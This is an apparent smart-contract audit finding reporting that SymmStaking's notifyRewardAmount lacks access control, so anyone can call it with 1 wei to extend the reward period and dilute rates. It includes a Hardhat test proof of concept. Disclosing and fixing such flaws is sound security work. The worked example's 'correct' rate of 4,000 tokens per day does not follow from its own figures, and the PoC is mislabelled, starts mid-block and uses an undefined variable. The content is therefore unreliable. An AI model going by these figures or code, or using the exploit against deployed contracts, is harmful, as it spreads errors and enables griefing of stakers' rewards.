# Arbitrary address can dilute the staking rewards because of missing access control

### Summary

Anyone can call `notifyRewardAmount` and dilute the reward amount

### Root Cause

In SymmStaking, `notifyRewardAmount` is missing access control. Anyone can call it with 1 wei amount, which internally will call `_addRewardsForToken`.

In `_addRewardsForToken`, if rewards period is not finished, [it will calculate the new rate with this formula](https://github.com/sherlock-audit/2025-03-symm-io-stacking/blob/main/token/contracts/staking/SymmStaking.sol#L374C4-L374C54) `state.rate = (amount + leftover) / state.duration;`. This is wrong, because it shouldnt divide by the full duration, but by the remaining duration.

Too see the effect lets try a test:

Lets assume the following:
Duration: 30 days (2,592,000 seconds)
Initial reward: 30,000 tokens
Initial rate: 1,000 tokens/day

When first time `notifyRewardAmount` is called, the rate will be 1000 tokens per day.

Half way through the fn is called again with 30,000 tokens:

### What happened:
Duration - its reset to 30 days from now. This will mean that the original end is extended by 15 days.
New rate - Because duration is reset, this will = 1,500 per day.
### What should have happened:
Duration - left as it is
New rate - 4,000 per day


Because of the demonstrated effect, attacker can call it with amounts = 1 and dillute the rewards and make the process slow.



### Internal Pre-conditions

The attack cannot happen if the rewards period is over

### External Pre-conditions

Attack must have some amounts of the staked token

### Attack Path

1. attacker obtains some staked token
2. calls `notifyRewards` each time with amount = 1
3. the duration will always increase and rate delute

### Impact

Dilution of staking rewards; making the whole process extremely slow

### PoC

Create a test `.ts`:
```solidity

        await stakingToken.connect(admin).mint(user2.address, initialBalance)
        await stakingToken.connect(admin).mint(admin.address, initialBalance)

        const ERC20 = await ethers.getContractFactory("MockERC20")

        await usdtToken.waitForDeployment()
    
        // USDC Token
        usdcToken = await ERC20.deploy("USDC", "USDC")
        await usdcToken.waitForDeployment()
    })

    it('will show that anyone can dilute rewards and increase reward duration', async () => {

        console.log(await symmStaking.connect(admin).rewardState(await usdcToken.getAddress()));


        // User1 stakes tokens
        await stakingToken.connect(user1).approve(await symmStaking.getAddress(), "100000")
        await symmStaking.connect(user1).deposit("100000", user1.address)
    
        // User1 approves USDC to be used for rewards

        await usdcToken.connect(user1).approve(await symmStaking.getAddress(), 1);
        
        await symmStaking.connect(user1).notifyRewardAmount([await usdcToken.getAddress()], [1])
    
        await time.increase(86401);
    
        const updatedRewardState = await symmStaking.connect(user1).rewardState(await usdcToken.getAddress());
        console.log("Updated Reward State:", updatedRewardState);
        
        // Optional: Add these lines to clearly show the vulnerability
        console.log("Reward rate decreased:", originalRewardState.rate > updatedRewardState.rate);
        console.log("Reward period extended:", updatedRewardState.periodFinish > originalRewardState.periodFinish);

        expect(originalRewardState.rate).to.above(updatedRewardState.rate);
        expect(updatedRewardState.periodFinish).to.above(originalRewardState.periodFinish);
    });
});
```

run the test with `npx hardhat test path/to/test.ts`

### Mitigation

Add restriction to the fn, so that its called by authorized and trusted parties. Fix the notification update fn so that it doesnt reset the period
